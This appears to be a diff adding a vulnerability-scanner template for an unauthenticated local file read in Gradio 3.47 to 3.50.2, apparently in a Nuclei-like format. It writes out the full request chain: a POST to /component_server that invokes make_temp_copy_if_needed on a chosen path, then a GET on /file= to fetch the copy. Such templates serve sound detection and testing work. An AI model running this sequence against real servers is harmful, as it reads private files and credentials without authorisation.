@@ -1,0 +1,42 @@
+id: gradio-component-server-lfi
+brief:
+    title: Gradio 3.47/3.50.2 - Local File Inclusion
+    by: nvn1729
+    level: high
+    about: Local file read by calling arbitrary methods of Components class between Gradio versions 3.47 / 3.50.2
+    label:
+        - cve
+        - cve2024
+        - intrusive
+        - unauth
+        - gradio
+        - lfi
+        - lfr
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/'
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/component_server'
+      signs: []
+    - verb: POST
+      to:
+        - '{{BaseURL}}/component_server'
+      head:
+        Content-Type: application/json
+      body: '{"component_id": "{{fuzz_component_id}}", "data": "{{path}}", "fn_name": "make_temp_copy_if_needed", "session_hash": "aaaaaaaaaaa"}'
+      signs:
+        - "on": status
+          status:
+            - 200
+    - verb: GET
+      to:
+        - '{{BaseURL}}/file={{download_path}}'
+      signs:
+        - "on": status
+          status:
+            - 200
